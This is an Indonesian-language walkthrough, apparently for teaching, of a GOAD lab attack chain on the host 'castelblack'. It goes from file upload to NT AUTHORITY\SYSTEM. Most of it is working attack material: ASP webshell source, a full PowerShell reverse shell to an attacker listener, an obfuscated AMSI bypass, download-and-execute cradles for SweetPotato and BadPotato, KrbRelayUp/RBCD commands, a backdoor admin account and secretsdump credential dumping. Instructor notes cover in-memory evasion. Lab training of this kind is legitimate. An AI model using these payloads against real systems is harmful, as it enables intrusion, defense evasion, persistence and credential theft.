# Skenario — File Upload → Privilege Escalation → NT AUTHORITY\SYSTEM

Target: `castelblack` (192.168.56.22) — IIS (allow ASP upload) + MSSQL, **Defender OFF** secara default di GOAD.

Alur: upload webshell → command execution sebagai user IIS → reverse shell → abusekan `SeImpersonatePrivilege` → SYSTEM.

---

## Fase 1 — Identifikasi Aplikasi Upload

Aplikasi ASP.NET sederhana di `http://192.168.56.22/` menyediakan **file upload** (folder `/upload`).

```bash
curl -s http://192.168.56.22/ | grep -i upload
gobuster dir -u http://192.168.56.22 -w /usr/share/wordlists/dirb/common.txt
```

**Pembelajaran:** fitur upload tanpa validasi ekstensi = entry point utama menuju RCE.

---

## Fase 2 — Upload Webshell ASP

Buat `webshell.asp` (ASP, hindari signature Defender):

```asp
<%
Function getResult(theParam)
    Dim objSh, objResult
    Set objSh = CreateObject("WScript.Shell")
    Set objResult = objSh.exec(theParam)
    getResult = objResult.StdOut.ReadAll
end Function
%>
<HTML>
    <BODY>
        Enter command:
        <FORM action="" method="POST">
            <input type="text" name="param" size=45 value="<%= myValue %>">
            <input type="submit" value="Run">
        </FORM>
        <p>Result :
        <%
        myValue = request("param")
        thisDir = getResult("cmd /c" & myValue)
        Response.Write(thisDir)
        %>
        </p>
    </BODY>
</HTML>
```

Upload via form/browser ke `http://192.168.56.22/upload/webshell.asp`.

**Verifikasi RCE:**

```bash
curl -s -X POST http://192.168.56.22/upload/webshell.asp -d "param=whoami"
#  -> iis apppool\defaultapppool  (user IIS, bukan SYSTEM)
```

---

## Fase 3 — Reverse Shell

```bash
# Di attacker (siapkan listener)
nc -nlvp 4445

# Di webshell, jalankan reverse shell powershell:
param=powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('192.168.56.1',4445);$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$r=$sb+'PS> ';$t=[text.encoding]::ASCII.GetBytes($r);$s.Write($t,0,$t.Length)}"
```

**Cek privilege:**

```powershell
whoami /priv
#  -> SeImpersonatePrivilege : ENABLED
```

**Pembelajaran:** service account IIS/MSSQL punya `SeImpersonatePrivilege` → dasar dari teknik "Potato".

---

## Fase 4 — (Opsional) AMSI Bypass bila Defender Aktif

Jika mengaktifkan Defender (untuk latihan), bypass AMSI dulu:

```powershell
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');
$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');
$z=$y.GetValue($null);
[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
```

Lalu patch `AmsiScanBuffer` di `amsi.dll` (rasta-mouse) dan load dari HTTP server:

```powershell
(new-object system.net.webclient).downloadstring('http://192.168.56.1:8080/amsi_rmouse.txt')|IEX
```

---

## Fase 5 — Privesc #1: SweetPotato / PrintSpoofer → SYSTEM

**Prinsip:** abusekan `SeImpersonatePrivilege` untuk impersonate akun SYSTEM lewat named pipe + token (PrintSpoofer/Potato).

Siapkan di attacker:
```bash
cd /var/www/html
echo "@echo off" > runme.bat
echo "start /b powershell -nop -c \"...reverse shell...\"" >> runme.bat
python3 -m http.server 8080
```

Jalankan di reverse shell (SweetPotato in-memory):
```powershell
mkdir c:\temp; cd c:\temp
(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.1:8080/runme.bat','c:\temp\runme.bat')
$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.56.1:8080/SweetPotato.exe');
$asm=[System.Reflection.Assembly]::Load([byte[]]$data);
[SweetPotato.Program]::Main(@('-p=C:\temp\runme.bat'))
```

**Alternatif (PowerSharpPack + BadPotato):**
```powershell
iex(new-object net.webclient).downloadstring('http://192.168.56.1:8080/PowerSharpBinaries/Invoke-BadPotato.ps1')
Invoke-BadPotato -Command "c:\temp\runme.bat"
```

**Hasil:** reverse shell baru sebagai `nt authority\system`.

---

## Fase 6 — Privesc #2: KrbRelayUp → RBCD → Administrator (alternatif)

Syarat: LDAP signing tidak enforced + boleh add computer.

```bash
# cek syarat
cme ldap 192.168.56.11 -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M ldap-signing
cme ldap 192.168.56.11 -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M MAQ
```

Langkah:
```bash
# 1) add computer
addcomputer.py -computer-name 'krbrelay$' -computer-pass 'ComputerPassword' \
  -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH \
  'north.sevenkingdoms.local/jon.snow:iknownothing'

# 2) ambil SID komputer
# 3) cari port SYSTEM (CheckPort.exe -> mis. 443)
# 4) jalankan KrbRelay
.\KrbRelay.exe -spn ldap/winterfell.north.sevenkingdoms.local \
  -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd <SID-krbrelay$> -port 443

# 5) eksploitasi RBCD
getTGT.py -dc-ip winterfell.north.sevenkingdoms.local 'north.sevenkingdoms.local/krbrelay$:ComputerPassword'
export KRB5CCNAME=./krbrelay$.ccache
getST.py -impersonate administrator -spn CIFS/castelblack.north.sevenkingdoms.local \
  -k -no-pass -dc-ip winterfell.north.sevenkingdoms.local 'north.sevenkingdoms.local/krbrelay$'
wmiexec.py -k @castelblack.north.sevenkingdoms.local   # -> north\administrator
```

**Hasil:** akses sebagai `administrator` domain (bisa lanjut dump LSASS → SYSTEM).

---

## Fase 7 — Validasi & Bukti Kompromi

```powershell
whoami                          # nt authority\system
whoami /priv
net user attacker Passw0rd! /add
net localgroup Administrators attacker /add
secretsdump.py NORTH/jon.snow:iknownothing@192.168.56.22   # dump SAM/LSASS
```

---

## Ringkasan

| Fase | Teknik | Output |
|---|---|---|
| 1-2 | Upload webshell ASP | RCE user IIS |
| 3 | Reverse shell | akses interaktif |
| 4 | AMSI bypass | lolos Defender |
| 5 | SweetPotato/BadPotato | **NT AUTHORITY\SYSTEM** |
| 6 | KrbRelayUp → RBCD | administrator (alternatif) |
| 7 | Dump + persistensi | bukti kompromi |

---

## Catatan Pengajar

- **Fase 5 (Potato)** = jalur PE paling langsung dari `SeImpersonatePrivilege`; SweetPotato default pakai teknik PrintSpoofer.
- **Fase 6 (KrbRelayUp)** tidak butuh privilege khusus, hanya LDAP signing mati + MAQ; berguna bila Potato diblokir.
- Defender **OFF** di castelblack → Fase 4 (AMSI bypass) opsional; aktifkan dulu bila ingin melatih evasion.
- Semua eksekusi .NET usahakan **in-memory** (reflective assembly) agar tak tersentuh disk ("the disk is lava").
